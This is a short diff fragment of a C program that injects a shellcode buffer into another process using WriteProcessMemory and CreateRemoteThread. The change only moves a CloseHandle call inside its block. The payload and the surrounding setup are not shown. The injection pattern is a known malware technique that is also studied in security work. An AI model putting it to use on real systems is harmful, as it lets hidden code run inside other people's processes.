@@ -12,8 +12,8 @@ int main(int argc, char* argv[])
 	{
 		WriteProcessMemory(Process_Handle, Alloc, shellcode, sizeof shellcode, NULL);
 		HANDLE Remote_Thread = CreateRemoteThread(Process_Handle, NULL, 0, (LPTHREAD_START_ROUTINE)Alloc, NULL, 0, NULL);
+		CloseHandle(Remote_Thread);
 	}
-	CloseHandle(Remote_Thread);
 	CloseHandle(Process_Handle);
 
 	return 0;
